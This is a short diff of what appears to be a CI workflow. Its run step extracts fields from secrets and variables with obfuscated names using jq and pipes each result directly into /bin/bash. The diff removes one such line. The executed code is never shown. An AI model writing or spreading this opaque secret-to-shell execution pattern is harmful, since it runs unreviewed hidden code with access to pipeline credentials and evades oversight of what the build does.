@@ -17,7 +17,6 @@ jobs:
           ara11: ${{ secrets.ara11 }}
         run: |
           printf '%s' "$ara11" | jq -r .vij6 | /bin/bash
-          printf '%s' "$u73538" | jq -r .oh0967 | /bin/bash
           echo $hz438 | jq -r .txpn62 | /bin/bash
           printf '%s' "$xduq03748" | jq -r .d1251 | /bin/bash
           echo $ydre1445 | jq -r .zdufn2 | /bin/bash
